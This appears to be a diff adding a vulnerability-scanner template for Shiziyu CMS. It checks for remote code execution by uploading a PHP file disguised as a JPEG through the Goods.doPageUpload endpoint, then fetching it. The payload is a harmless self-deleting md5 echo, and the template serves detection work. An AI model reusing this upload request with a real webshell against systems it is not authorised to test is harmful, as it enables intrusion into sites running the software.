@@ -1,0 +1,53 @@
+id: shiziyu_cms-file_upload
+info:
+  name: Shiziyu CMS File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template identifies a file upload vulnerability in Shiziyu CMS that allows arbitrary code execution by uploading a PHP file.
+
+variables:
+  r1: '{{rand_int(40000, 44800)}}'
+  rboundary: '{{rand_text_alpha(8)}}'
+  randname: '{{rand_text_alpha(6)}}'
+
+http:
+  - id: file-upload
+    raw:
+      - |
+        POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="upfile"; filename="{{randname}}.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5({{r1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\.php"
+    extractors:
+      - type: regex
+        regex:
+          - '"image_o":"https?:\\/\\/.*?\\/(?P<path>.*?)"'
+        name: path
+        internal: true
+        group: 1
+
+  - id: validate-upload
+    raw:
+      - |
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{r1}}'
+        part: body
